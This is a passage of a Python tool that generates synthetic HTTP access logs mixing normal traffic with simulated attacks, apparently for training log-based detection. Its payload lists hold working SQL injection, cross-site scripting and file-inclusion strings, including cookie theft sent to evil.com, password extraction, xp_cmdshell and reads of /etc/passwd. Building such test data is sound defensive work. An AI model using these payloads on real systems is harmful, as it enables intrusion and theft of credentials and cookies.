#!/usr/bin/env python3
"""
HTTP Access-Log Generator
=========================
Generates synthetic Nginx/Apache access logs with realistic normal traffic
and configurable attack scenarios.

Usage examples
--------------
  # Quick demo — mixed attacks, write to file:
  python tools/generate_logs.py --mode mixed --output test_logs/demo.log

  # Single attack type:
  python tools/generate_logs.py --mode sqli --sqli-count 30 --output test_logs/sqli.log

  # High-intensity mixed attack from 3 concurrent attackers:
  python tools/generate_logs.py --mode mixed --intensity high --attackers 3 --output test_logs/heavy.log

  # Multi-stage campaign (recon → brute → exploit):
  python tools/generate_logs.py --mode campaign --output test_logs/campaign.log

  # Choose specific attacks in mixed mode:
  python tools/generate_logs.py --mode mixed --attacks sqli,xss --output test_logs/web_attacks.log

  # Reproduce exact log (same seed):
  python tools/generate_logs.py --mode mixed --seed 1337 --output test_logs/replay.log

  # Common log format (no User-Agent / Referer):
  python tools/generate_logs.py --mode bruteforce --format common --output test_logs/bf_common.log

All modes
---------
  normal      Only benign traffic (baseline)
  bruteforce  Credential stuffing on login endpoints
  scanning    Vulnerability/directory scanner
  sqli        SQL Injection probing
  xss         Cross-Site Scripting probing
  lfi         Local File Inclusion / path traversal
  dos         Denial-of-Service flood
  mixed       All selected attacks at random times (default: all five)
  campaign    Realistic multi-stage attack: recon → brute-force → exploit

Intensity presets (--intensity)
--------------------------------
  low     Short bursts, slow pacing  → easy for the model
  medium  Default values              → balanced
  high    Long bursts, fast pacing   → aggressive

Flags summary
-------------
  --format       combined | common            (default: combined)
  --mode         see above                    (default: mixed)
  --seed         integer random seed          (default: 42)
  --tz           timezone offset hours        (default: +3)
  --output       path to write log            (default: stdout)
  --intensity    low | medium | high          (default: medium)
  --attackers    number of attacker IPs       (default: 1)
  --attacks      comma list for mixed mode    (default: all)
  --warmup-min   normal traffic before attacks
  --tail-min     normal traffic after attacks
  --bf-seconds   brute-force duration (s)
  --scan-seconds scanning duration (s)
  --sqli-count   number of SQLi requests
  --xss-count    number of XSS requests
  --lfi-count    number of LFI requests
  --dos-seconds  DoS flood duration (s)
  --dos-rps      DoS requests-per-second
"""

import argparse
import random
import sys
from datetime import datetime, timedelta, timezone

# ---------------------------------------------------------------------------
# User-Agent pools
# ---------------------------------------------------------------------------

UA_NORMAL = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
]

UA_TOOLS = [
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "sqlmap/1.6.12 (Python 3.11)",
    "XSS-Scanner/2.0",
    "Nikto/2.1.6",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Wget/1.21.4",
    "libwww-perl/6.72",
    "masscan/1.3.2",
    "nmap/7.94",
]

UA_BOTS = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "AhrefsBot/7.0 (+http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
]

# ---------------------------------------------------------------------------
# URL pools
# ---------------------------------------------------------------------------

PUBLIC_PAGE_PATHS = [
    "/", "/index.html", "/about", "/about-us", "/contact", "/faq",
    "/blog", "/blog/post/123", "/blog/post/456", "/docs", "/docs/api", "/help",
    "/profile", "/settings",
]

CATALOG_PATHS = [
    "/products", "/products?category=electronics", "/products?category=books",
    "/search?q=phone", "/search?q=tablet", "/api/search?q=laptop",
    "/cart", "/checkout",
]

API_READ_PATHS = [
    "/api/items", "/api/items?page=1", "/api/items?page=2&limit=20",
    "/api/users/me", "/api/search",
]

STATIC_PATHS = [
    "/static/app.js", "/static/styles.css", "/static/logo.png",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
]

AUTH_FLOW_PATHS = [
    "/login", "/signin", "/auth/login", "/account/login", "/user/login",
]

BENIGN_EDGE_PATHS = [
    "/admin",
    "/admin/login",
    "/search?q=union+square+hotel",
    "/search?q=select+phone",
    "/docs/sql/select-basics",
    "/docs/frontend/onload-events",
    "/api/search?q=script+tag+tutorial",
    "/products?sort=order+by+price",
    "/search?q=%3C3+sale",
]

NORMAL_PATHS = PUBLIC_PAGE_PATHS + CATALOG_PATHS + API_READ_PATHS + STATIC_PATHS + AUTH_FLOW_PATHS + BENIGN_EDGE_PATHS

LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/auth/login",
    "/admin", "/admin/login", "/wp-login.php", "/wp-admin",
    "/user/login", "/account/login", "/panel",
]

SCAN_WORDLIST = [
    # Sensitive files
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.htaccess", "/.htpasswd",
    "/wp-config.php", "/wp-config.php.bak", "/config.php",
    "/database.yml", "/db.sql", "/backup.zip", "/backup.tar.gz",
    # Admin panels
    "/wp-admin", "/wp-admin/admin-ajax.php",
    "/phpmyadmin", "/phpmyadmin/index.php",
    "/adminer.php", "/admin.php", "/admin/config",
    "/panel", "/cpanel", "/webmail",
    # Sensitive endpoints
    "/server-status", "/server-info", "/nginx_status",
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/dump", "/actuator/mappings",
    "/api/debug", "/api/v1/admin", "/console",
    "/swagger.json", "/swagger-ui.html", "/openapi.json",
    "/graphql", "/graphiql",
    # Common CMS/framework paths
    "/proc/self/environ", "/etc/passwd",
    "/../../../etc/passwd", "/../../../../etc/shadow",
]

SQLI_PAYLOADS = [
    # Classic / error-based
    "/products?id=1 OR 1=1",
    "/products?id=1' OR '1'='1",
    "/products?id=1\" OR \"1\"=\"1",
    "/api/items?filter=1; SELECT 1,2,3--",
    "/api/users?id=1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    # UNION-based
    "/api/items?search=' UNION SELECT NULL,NULL--",
    "/api/items?search=' UNION SELECT password,username FROM users--",
    "/api/items?search=' UNION ALL SELECT concat(username,0x3a,password) FROM users--",
    "/products?sort=name UNION SELECT null,load_file('/etc/passwd')--",
    # Blind / time-based
    "/index.html?q=1' AND SLEEP(5)--",
    "/api/data?id=1' AND BENCHMARK(5000000,MD5('test'))--",
    "/products?id=1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "/api/items?page=1' WAITFOR DELAY '0:0:5'--",
    # Error-based extraction
    "/products?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "/api/v2?id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Schema enumeration
    "/search?q=1' ORDER BY 10--",
    "/search?q=1' HAVING 1=1--",
    "/api/items?filter=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    # Stacked queries / command exec
    "/api/v2/items?id=1; EXEC xp_cmdshell('whoami')--",
    "/products?id=1; DROP TABLE users--",
    # URL-encoded / obfuscated
    "/products?id=1%27%20OR%20%271%27%3D%271",
    "/api/items?q=1%27%20UNION%20SELECT%20load_file(%27/etc/passwd%27)--",
    "/search?q=%31%27%20%4f%52%20%31%3d%31--",
    # Second-order / out-of-band
    "/register?username=admin'--",
    "/api/items?sort=1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd')--",
]

XSS_PAYLOADS = [
    # Script injection (raw and URL-encoded)
    "/search?q=<script>alert(1)</script>",
    "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/search?q=<script>alert(document.domain)</script>",
    # Event handler injection
    "/comments?text=<img src=x onerror=alert(1)>",
    "/comments?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "/profile?name=\"><svg onload=alert(document.cookie)>",
    "/profile?bio=<details open ontoggle=alert(1)>",
    "/search?q=<body onload=alert('xss')>",
    "/api/name?v=<input autofocus onfocus=alert(1)>",
    "/page?title=<marquee onstart=alert(1)>test</marquee>",
    # JavaScript protocol
    "/redirect?next=javascript:alert(1)",
    "/comments?link=javascript:void(fetch('//evil.com?c='+document.cookie))",
    # Iframe / object injection
    "/search?q=<iframe src='javascript:alert(1)'>",
    "/search?q=<object data='javascript:alert(1)'>",
    # DOM-based / data exfil
    "/api/feedback?msg=<script>new Image().src='//evil.com/?c='+document.cookie</script>",
    "/search?q=<script>fetch('//evil.com/steal?cookie='+document.cookie)</script>",
    # Template / expression injection
    "/search?q={{7*7}}",
    "/search?q=${7*7}",
    # SVG / polyglots
    "/comments?text=<svg><script>alert(1)</script></svg>",
    "/comments?text=<svg/onload=alert('XSS')>",
    # Encoded variants
    "/search?q=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C%2Fscript%3E",
    "/comments?msg=<a href=javascript:alert(1)>click</a>",
    # CSS injection
    "/profile?style=<style>@import%20'javascript:alert(1)'</style>",
]

LFI_PAYLOADS = [
    # Classic traversal
    "/download?file=../../../../etc/passwd",
    "/page?include=../../../etc/shadow",
    "/api/file?name=../../etc/passwd",
    "/static?path=../../../../proc/self/environ",
    "/view?doc=../../../windows/win.ini",
    # URL-encoded traversal
    "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/page?include=..%2F..%2F..%2Fetc%2Fshadow",
    "/api/read?path=%2e%2e%2f%2e%2e%2fetc%2fhosts",
    # Double-encoded
    "/page?file=..%252F..%252F..%252Fetc%252Fpasswd",
    "/download?path=..%252fetc%252fpasswd",
    # Null byte (legacy)
    "/page?include=../../../../etc/passwd%00",
    "/download?file=../../../../etc/passwd%00.jpg",
    # Absolute path
    "/api/file?path=/etc/passwd",
    "/api/log?name=/var/log/apache2/access.log",
    "/page?include=/proc/self/environ",
    # Windows paths
    "/download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/page?name=C:\\boot.ini",
    # PHP wrappers (RFI/LFI)
    "/page?include=php://filter/convert.base64-encode/resource=index.php",
    "/api/read?file=php://input",
    "/page?inc=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
    # Log poisoning targets
    "/api/file?name=/var/log/nginx/access.log",
    "/page?include=/var/log/auth.log",
]

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def fmt_time(ts: datetime) -> str:
    return ts.strftime("%d/%b/%Y:%H:%M:%S %z")


def parse_ts(line: str) -> datetime:
    s = line.index("[") + 1
    e = line.index("]")
    return datetime.strptime(line[s:e], "%d/%b/%Y:%H:%M:%S %z")


def make_line_combined(ts, ip, method, url, status, size, ua, ref="-"):
    return f'{ip} - - [{fmt_time(ts)}] "{method} {url} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def make_line_common(ts, ip, method, url, status, size):
    return f'{ip} - - [{fmt_time(ts)}] "{method} {url} HTTP/1.1" {status} {size}'


def emit_line(fmt: str, ts, ip, method, url, status, size, ua=None):
    if fmt == "combined":
        return make_line_combined(ts, ip, method, url, status, size, ua or random.choice(UA_NORMAL))
    if fmt == "common":
        return make_line_common(ts, ip, method, url, status, size)
    raise ValueError(f"Unknown format: {fmt!r}")


def _ms(low: int, high: int) -> timedelta:
    return timedelta(milliseconds=random.randint(low, high))


def _random_public_ip() -> str:
    """Generate a random routable IP (avoiding RFC-1918 and reserved ranges)."""
    while True:
        a = random.randint(1, 223)
        if a in (10, 127, 172, 192):
            continue
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def _pick_spread_times(n: int, zone_start_s: int, zone_end_s: int, min_gap_s: int = 60) -> list[int]:
    """Return n sorted random offsets in [zone_start_s, zone_end_s] with min_gap_s spacing."""
    span = zone_end_s - zone_start_s
    if span <= 0 or n <= 0:
        return []
    for _ in range(1000):
        times = sorted(random.randint(zone_start_s, zone_end_s) for _ in range(n))
        if all(times[i + 1] - times[i] >= min_gap_s for i in range(len(times) - 1)):
            return times
    # Fallback: evenly spread
    step = max(1, span // n)
    return [
        min(zone_end_s, zone_start_s + i * step + random.randint(-step // 4, step // 4))
        for i in range(n)
    ]


# ---------------------------------------------------------------------------
# Intensity presets
# ---------------------------------------------------------------------------

INTENSITY_PRESETS = {
    "low": dict(
        bf_seconds=30, scan_seconds=30, sqli_count=5, xss_count=5,
        lfi_count=5, dos_seconds=5, dos_rps=210,
        bf_burst_range=(3, 8), bf_gap_ms=(2000, 12000),
        scan_delay_ms=(1500, 4000), sqli_delay_ms=(3000, 10000),
        xss_delay_ms=(2000, 8000), lfi_delay_ms=(2000, 8000),
    ),
    "medium": dict(
        bf_seconds=90, scan_seconds=90, sqli_count=15, xss_count=15,
        lfi_count=10, dos_seconds=20, dos_rps=350,
        bf_burst_range=(5, 20), bf_gap_ms=(1000, 8000),
        scan_delay_ms=(500, 2000), sqli_delay_ms=(1000, 8000),
        xss_delay_ms=(500, 5000), lfi_delay_ms=(500, 4000),
    ),
    "high": dict(
        bf_seconds=180, scan_seconds=120, sqli_count=40, xss_count=40,
        lfi_count=25, dos_seconds=40, dos_rps=600,
        bf_burst_range=(15, 50), bf_gap_ms=(200, 2000),
        scan_delay_ms=(100, 700), sqli_delay_ms=(200, 2000),
        xss_delay_ms=(100, 1500), lfi_delay_ms=(100, 1500),
    ),
}

# ---------------------------------------------------------------------------
# Traffic generators
# ---------------------------------------------------------------------------

def _pick_normal_request() -> tuple[str, str, int, int, str, str]:
    """Sample a benign request with endpoint-aware method/status combinations."""
    referers = ["-", "https://google.com/", "https://bing.com/", "https://t.co/x", "-", "-"]
    profile = random.choices(
        ["page", "catalog", "api", "static", "auth", "edge"],
        weights=[28, 20, 17, 15, 12, 8],
    )[0]

    if profile == "page":
        path = random.choice(PUBLIC_PAGE_PATHS)
        method = random.choices(["GET", "HEAD"], weights=[94, 6])[0]
        status = random.choices([200, 301, 404, 500], weights=[86, 7, 5, 2])[0]
        size = random.randint(1200, 28000)
        ua = random.choices(UA_NORMAL + UA_BOTS, weights=[95] * len(UA_NORMAL) + [4] * len(UA_BOTS))[0]
        ref = random.choice(referers)
    elif profile == "catalog":
        path = random.choice(CATALOG_PATHS)
        method = random.choices(["GET", "POST"], weights=[92, 8])[0]
        status = random.choices([200, 200, 301, 404, 500], weights=[72, 12, 7, 7, 2])[0]
        size = random.randint(600, 22000)
        ua = random.choice(UA_NORMAL)
        ref = random.choice(referers)
    elif profile == "api":
        path = random.choice(API_READ_PATHS)
        method = random.choices(["GET", "HEAD"], weights=[97, 3])[0]
        status = random.choices([200, 304, 404, 500], weights=[82, 7, 8, 3])[0]
        size = random.randint(250, 12000)
        ua = random.choice(UA_NORMAL)
        ref = "-"
    elif profile == "static":
        path = random.choice(STATIC_PATHS)
        method = random.choices(["GET", "HEAD"], weights=[90, 10])[0]
        status = random.choices([200, 304, 404], weights=[77, 18, 5])[0]
        size = random.randint(180, 24000)
        ua = random.choices(UA_NORMAL + UA_BOTS, weights=[96] * len(UA_NORMAL) + [5] * len(UA_BOTS))[0]
        ref = random.choice(["-", "https://google.com/", "https://bing.com/"])
    elif profile == "auth":
        path = random.choice(AUTH_FLOW_PATHS + ["/profile", "/checkout"])
        method = random.choices(["GET", "POST"], weights=[58, 42])[0]
        if method == "POST":
            status = random.choices([200, 302, 401, 403, 429], weights=[40, 28, 20, 8, 4])[0]
        else:
            status = random.choices([200, 302, 404], weights=[82, 13, 5])[0]
        size = random.randint(250, 9000)
        ua = random.choice(UA_NORMAL)
        ref = random.choice(referers)
    else:
        path = random.choice(BENIGN_EDGE_PATHS)
        method = random.choices(["GET", "POST"], weights=[90, 10])[0]
        status = random.choices([200, 200, 301, 404], weights=[63, 17, 12, 8])[0]
        size = random.randint(350, 14000)
        ua = random.choice(UA_NORMAL)
        ref = random.choice(referers)

    return path, method, status, size, ua, ref

def normal_traffic(lines: list, fmt: str, start_ts: datetime, seconds: int, ips: list) -> datetime:
    """Realistic background traffic with variable pacing and occasional bot hits."""
    ts = start_ts
    end_ts = start_ts + timedelta(seconds=seconds)
    while ts < end_ts:
        ip = random.choice(ips)
        path, method, status, size, ua, ref = _pick_normal_request()
        if fmt == "combined":
            lines.append(make_line_combined(ts, ip, method, path, status, size, ua, ref))
        else:
            lines.append(make_line_common(ts, ip, method, path, status, size))
        ts += _ms(300, 5000)
    return ts


def attack_bruteforce(
    lines: list, fmt: str, start_ts: datetime, seconds: int,
    ips: list, *, burst_range=(5, 20), gap_ms=(1000, 8000),
) -> datetime:
    """Credential stuffing: rapid bursts of failed logins, pause between bursts.

    Supports multiple attacker IPs (distributed brute force).
    """
    ts = start_ts
    end_ts = start_ts + timedelta(seconds=seconds)
    while ts < end_ts:
        ip = random.choice(ips)
        path = random.choice(LOGIN_PATHS)
        burst = random.randint(*burst_range)
        for _ in range(burst):
            if ts >= end_ts:
                break
            status = random.choices([401, 403, 429], weights=[70, 25, 5])[0]
            size = random.randint(200, 900)
            lines.append(emit_line(fmt, ts, ip, "POST", path, status, size, random.choice(UA_TOOLS[:6])))
            ts += _ms(30, 500)
        ts += _ms(*gap_ms)
    return ts


def attack_scanning(
    lines: list, fmt: str, start_ts: datetime, seconds: int,
    ips: list, *, delay_ms=(500, 2000),
) -> datetime:
    """Vulnerability/directory scanner: methodical probing of common paths."""
    ts = start_ts
    end_ts = start_ts + timedelta(seconds=seconds)
    while ts < end_ts:
        ip = random.choice(ips)
        path = random.choice(SCAN_WORDLIST)
        # Occasionally append parameters
        if random.random() < 0.25:
            path += f"?id={random.randint(1, 9999)}"
        elif random.random() < 0.15:
            path += f"?debug=true"
        status = random.choices([404, 403, 500, 200, 301], weights=[50, 30, 10, 6, 4])[0]
        size = random.randint(100, 700)
        ua = random.choice(["curl/8.5.0", "Nikto/2.1.6", "python-requests/2.31.0", "masscan/1.3.2"])
        lines.append(emit_line(fmt, ts, ip, "GET", path, status, size, ua))
        ts += _ms(*delay_ms)
    return ts


def attack_sqli(
    lines: list, fmt: str, start_ts: datetime, count: int,
    ips: list, *, delay_ms=(1000, 8000),
) -> datetime:
    """SQL Injection probing: deliberate pacing to avoid rate limiting."""
    ts = start_ts
    for _ in range(count):
        ip = random.choice(ips)
        url = random.choice(SQLI_PAYLOADS)
        method = random.choices(["GET", "POST"], weights=[70, 30])[0]
        status = random.choices([200, 400, 403, 500], weights=[20, 30, 15, 35])[0]
        size = random.randint(100, 2000)
        ua = random.choices(UA_TOOLS[:2] + UA_NORMAL[:2], weights=[40, 40, 10, 10])[0]
        lines.append(emit_line(fmt, ts, ip, method, url, status, size, ua))
        ts += _ms(*delay_ms)
    return ts


def attack_xss(
    lines: list, fmt: str, start_ts: datetime, count: int,
    ips: list, *, delay_ms=(500, 5000),
) -> datetime:
    """XSS probing: scanning for unsanitised reflection points."""
    ts = start_ts
    for _ in range(count):
        ip = random.choice(ips)
        url = random.choice(XSS_PAYLOADS)
        method = random.choices(["GET", "POST"], weights=[75, 25])[0]
        status = random.choices([200, 400, 403, 500], weights=[45, 25, 20, 10])[0]
        size = random.randint(100, 2000)
        ua = random.choices(UA_TOOLS[3:5] + UA_NORMAL[:2], weights=[40, 40, 10, 10])[0]
        lines.append(emit_line(fmt, ts, ip, method, url, status, size, ua))
        ts += _ms(*delay_ms)
    return ts


def attack_lfi(
    lines: list, fmt: str, start_ts: datetime, count: int,
    ips: list, *, delay_ms=(500, 4000),
) -> datetime:
    """Local File Inclusion / path traversal: attempting to read server files."""
    ts = start_ts
    for _ in range(count):
        ip = random.choice(ips)
        url = random.choice(LFI_PAYLOADS)
        status = random.choices([200, 400, 403, 404, 500], weights=[15, 25, 35, 20, 5])[0]
        size = random.randint(100, 5000)
        ua = random.choices(UA_TOOLS[4:7] + UA_NORMAL[:1], weights=[30, 30, 30, 10])[0]
        lines.append(emit_line(fmt, ts, ip, "GET", url, status, size, ua))
        ts += _ms(*delay_ms)
    return ts


def attack_dos(
    lines: list, fmt: str, start_ts: datetime, seconds: int, rps: int,
    ips: list,
) -> datetime:
    """DoS/DDoS flood: very high rate from a pool of IPs."""
    ts = start_ts
    total = seconds * rps
    step_ms = max(1, int(1000 / max(1, rps)))
    dos_paths = ["/api/items", "/api/search", "/api/items?page=1", "/", "/api/users"]
    for _ in range(total):
        ip = random.choice(ips)
        url = random.choice(dos_paths)
        # Mix of realistic DoS-response codes
        status = random.choices([200, 429, 500, 503, 504], weights=[40, 20, 15, 15, 10])[0]
        size = random.randint(200, 3000)
        lines.append(emit_line(fmt, ts, ip, "GET", url, status, size, random.choice(UA_NORMAL)))
        ts += _ms(1, max(2, step_ms))
    return ts


def attack_campaign(
    lines: list, fmt: str, start_ts: datetime,
    attacker_ip: str, preset: dict,
) -> datetime:
    """Multi-stage attack campaign from a single IP.

    Stages (with realistic delays between them):
      1. Recon     — directory scanning to map the target
      2. Brute     — credential stuffing on discovered login panel
      3. SQLi      — injection probing on found endpoints
      4. XSS       — reflected XSS on search/form parameters
      5. LFI       — file read attempts on discovered includes
    """
    ts = start_ts
    stage_gap = timedelta(seconds=random.randint(30, 120))

    print(f"[campaign] Stage 1: Recon from {attacker_ip}", file=sys.stderr)
    ts = attack_scanning(lines, fmt, ts, preset["scan_seconds"] // 2, [attacker_ip],
                         delay_ms=preset["scan_delay_ms"])
    ts += stage_gap

    print(f"[campaign] Stage 2: Brute-force from {attacker_ip}", file=sys.stderr)
    ts = attack_bruteforce(lines, fmt, ts, preset["bf_seconds"] // 2, [attacker_ip],
                           burst_range=preset["bf_burst_range"],
                           gap_ms=preset["bf_gap_ms"])
    ts += stage_gap

    print(f"[campaign] Stage 3: SQLi from {attacker_ip}", file=sys.stderr)
    ts = attack_sqli(lines, fmt, ts, preset["sqli_count"] // 2, [attacker_ip],
                     delay_ms=preset["sqli_delay_ms"])
    ts += stage_gap

    print(f"[campaign] Stage 4: XSS from {attacker_ip}", file=sys.stderr)
    ts = attack_xss(lines, fmt, ts, preset["xss_count"] // 2, [attacker_ip],
                    delay_ms=preset["xss_delay_ms"])
    ts += stage_gap

    print(f"[campaign] Stage 5: LFI from {attacker_ip}", file=sys.stderr)
    ts = attack_lfi(lines, fmt, ts, preset["lfi_count"] // 2, [attacker_ip],
                    delay_ms=preset["lfi_delay_ms"])
    return ts


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

ALL_ATTACKS = ["bruteforce", "scanning", "sqli", "xss", "lfi", "dos"]


def main():
    ap = argparse.ArgumentParser(
        description="HTTP access-log generator with configurable attack scenarios",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    ap.add_argument("--format", choices=["combined", "common"], default="combined",
                    help="Log format (default: combined)")
    ap.add_argument("--mode",
                    choices=["normal", "bruteforce", "scanning", "sqli", "xss", "lfi", "dos",
                             "mixed", "campaign"],
                    default="mixed",
                    help="Traffic mode (default: mixed)")
    ap.add_argument("--seed", type=int, default=42,
                    help="Random seed for reproducibility (default: 42)")
    ap.add_argument("--tz", type=int, default=3,
                    help="Timezone offset in hours (default: +3)")
    ap.add_argument("--output", default=None,
                    help="Output file path (default: stdout)")
    ap.add_argument("--intensity", choices=["low", "medium", "high"], default="medium",
                    help="Attack intensity preset (default: medium)")
    ap.add_argument("--attackers", type=int, default=1,
                    help="Number of attacker IPs (default: 1). >1 simulates distributed attacks")
    ap.add_argument("--attacks", default=None,
                    help="Comma-separated attacks for mixed mode, e.g. 'sqli,xss'. "
                         "Default: all attacks")

    # Normal traffic framing
    ap.add_argument("--warmup-min", type=int, default=6,
                    help="Minutes of normal traffic before attacks (default: 6)")
    ap.add_argument("--tail-min", type=int, default=3,
                    help="Minutes of normal traffic after attacks (default: 3)")

    # Per-attack overrides (override intensity preset)
    ap.add_argument("--bf-seconds", type=int, default=None)
    ap.add_argument("--scan-seconds", type=int, default=None)
    ap.add_argument("--sqli-count", type=int, default=None)
    ap.add_argument("--xss-count", type=int, default=None)
    ap.add_argument("--lfi-count", type=int, default=None)
    ap.add_argument("--dos-seconds", type=int, default=None)
    ap.add_argument("--dos-rps", type=int, default=None)

    args = ap.parse_args()
    random.seed(args.seed)

    # --- Apply intensity preset, then apply CLI overrides ---
    preset = dict(INTENSITY_PRESETS[args.intensity])
    if args.bf_seconds is not None:
        preset["bf_seconds"] = args.bf_seconds
    if args.scan_seconds is not None:
        preset["scan_seconds"] = args.scan_seconds
    if args.sqli_count is not None:
        preset["sqli_count"] = args.sqli_count
    if args.xss_count is not None:
        preset["xss_count"] = args.xss_count
    if args.lfi_count is not None:
        preset["lfi_count"] = args.lfi_count
    if args.dos_seconds is not None:
        preset["dos_seconds"] = args.dos_seconds
    if args.dos_rps is not None:
        preset["dos_rps"] = args.dos_rps

    tz = timezone(timedelta(hours=args.tz))
    ips_normal = [f"192.168.{random.randint(1, 5)}.{i}" for i in range(10, 70)]

    # Build attacker IP pool
    if args.attackers == 1:
        attacker_pool = ["45.133.12.77"]
    else:
        attacker_pool = [_random_public_ip() for _ in range(args.attackers)]
        print(f"[info] Attacker IPs: {attacker_pool}", file=sys.stderr)

    dos_pool = [_random_public_ip() for _ in range(150)]

    lines: list[str] = []

    # ---- normal mode ----
    if args.mode == "normal":
        start = datetime.now(tz) - timedelta(minutes=args.warmup_min)
        normal_traffic(lines, args.format, start, args.warmup_min * 60, ips_normal)
        _output(lines, args.output)
        return

    # ---- campaign mode ----
    if args.mode == "campaign":
        camp_dur_s = (
            preset["scan_seconds"] // 2 + preset["bf_seconds"] // 2
            + preset["sqli_count"] * 5 + preset["xss_count"] * 3
            + preset["lfi_count"] * 3 + 600
        )
        total_s = args.warmup_min * 60 + camp_dur_s + args.tail_min * 60
        start = datetime.now(tz) - timedelta(seconds=total_s)
        normal_traffic(lines, args.format, start, total_s, ips_normal)
        camp_start = start + timedelta(minutes=args.warmup_min)
        attacker_ip = random.choice(attacker_pool)
        attack_campaign(lines, args.format, camp_start, attacker_ip, preset)
        lines.sort(key=parse_ts)
        _output(lines, args.output)
        return

    # ---- single-attack modes ----
    if args.mode != "mixed":
        attack_dur_s = {
            "bruteforce": preset["bf_seconds"],
            "scanning":   preset["scan_seconds"],
            "sqli":       preset["sqli_count"] * 8,
            "xss":        preset["xss_count"] * 5,
            "lfi":        preset["lfi_count"] * 4,
            "dos":        preset["dos_seconds"],
        }[args.mode]
        total_s = args.warmup_min * 60 + attack_dur_s + args.tail_min * 60 + 120
        start = datetime.now(tz) - timedelta(seconds=total_s)
        normal_traffic(lines, args.format, start, total_s, ips_normal)
        attack_offset = random.randint(
            args.warmup_min * 60,
            max(args.warmup_min * 60 + 1, total_s - args.tail_min * 60 - attack_dur_s),
        )
        attack_ts = start + timedelta(seconds=attack_offset)
        ip = random.choice(attacker_pool)
        _run_single(lines, args.format, args.mode, attack_ts, [ip], preset, dos_pool)
        lines.sort(key=parse_ts)
        _output(lines, args.output)
        return

    # ---- mixed mode ----
    chosen = _parse_attacks(args.attacks)
    attack_dur_s = _estimate_duration(chosen, preset)
    total_s = args.warmup_min * 60 + args.tail_min * 60 + attack_dur_s + 600
    start = datetime.now(tz) - timedelta(seconds=total_s)
    normal_traffic(lines, args.format, start, total_s, ips_normal)

    zone_start = args.warmup_min * 60
    zone_end = total_s - args.tail_min * 60 - 30
    offsets = _pick_spread_times(len(chosen), zone_start, zone_end, min_gap_s=60)
    random.shuffle(chosen)

    for attack_type, offset in zip(chosen, offsets):
        attack_ts = start + timedelta(seconds=offset)
        ip = random.choice(attacker_pool)
        pool = dos_pool if attack_type == "dos" else [ip]
        _run_single(lines, args.format, attack_type, attack_ts, pool, preset, dos_pool)

    lines.sort(key=parse_ts)
    _output(lines, args.output)


# ---------------------------------------------------------------------------
# Helpers for main()
# ---------------------------------------------------------------------------

def _parse_attacks(attacks_str) -> list[str]:
    if attacks_str is None:
        return list(ALL_ATTACKS)
    chosen = [a.strip().lower() for a in attacks_str.split(",")]
    invalid = [a for a in chosen if a not in ALL_ATTACKS]
    if invalid:
        print(f"[warn] Unknown attack types ignored: {invalid}", file=sys.stderr)
    return [a for a in chosen if a in ALL_ATTACKS] or list(ALL_ATTACKS)


def _estimate_duration(attacks: list[str], preset: dict) -> int:
    dur = 0
    for a in attacks:
        dur += {
            "bruteforce": preset["bf_seconds"],
            "scanning":   preset["scan_seconds"],
            "sqli":       preset["sqli_count"] * 8,
            "xss":        preset["xss_count"] * 5,
            "lfi":        preset["lfi_count"] * 4,
            "dos":        preset["dos_seconds"],
        }.get(a, 60)
    return dur


def _run_single(lines, fmt, attack_type, ts, attacker_ips, preset, dos_pool):
    if attack_type == "bruteforce":
        attack_bruteforce(lines, fmt, ts, preset["bf_seconds"], attacker_ips,
                          burst_range=preset["bf_burst_range"], gap_ms=preset["bf_gap_ms"])
    elif attack_type == "scanning":
        attack_scanning(lines, fmt, ts, preset["scan_seconds"], attacker_ips,
                        delay_ms=preset["scan_delay_ms"])
    elif attack_type == "sqli":
        attack_sqli(lines, fmt, ts, preset["sqli_count"], attacker_ips,
